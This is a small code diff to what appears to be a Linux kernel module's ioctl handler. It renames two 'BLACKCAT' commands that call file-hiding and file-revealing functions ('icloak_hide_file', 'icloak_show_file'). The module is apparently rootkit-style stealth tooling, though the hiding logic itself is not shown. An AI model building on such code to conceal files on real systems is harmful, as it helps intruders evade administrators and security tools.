@@ -19,8 +19,8 @@ long cdev_ioctl(struct file *fp, unsigned int cmd, unsigned long user_param) {
     char data[4096];
 
     switch (cmd) {
-        case BLACKCAT_BURY_FOLDER:
-        case BLACKCAT_DIG_UP_FOLDER:
+        case BLACKCAT_BURY:
+        case BLACKCAT_DIG_UP:
             if ((void *)user_param == NULL || !access_ok(VERIFY_READ, (void __user *)user_param, _IOC_SIZE(cmd))) {
                 return -EFAULT;
             }
@@ -37,8 +37,8 @@ long cdev_ioctl(struct file *fp, unsigned int cmd, unsigned long user_param) {
                 return -EFAULT;
             }
 
-            error = (cmd == BLACKCAT_BURY_FOLDER) ? icloak_hide_file(data) :
-                                                    icloak_show_file(data);
+            error = (cmd == BLACKCAT_BURY) ? icloak_hide_file(data) :
+                                             icloak_show_file(data);
 
             memset(data, 0, sizeof(data));
             break;
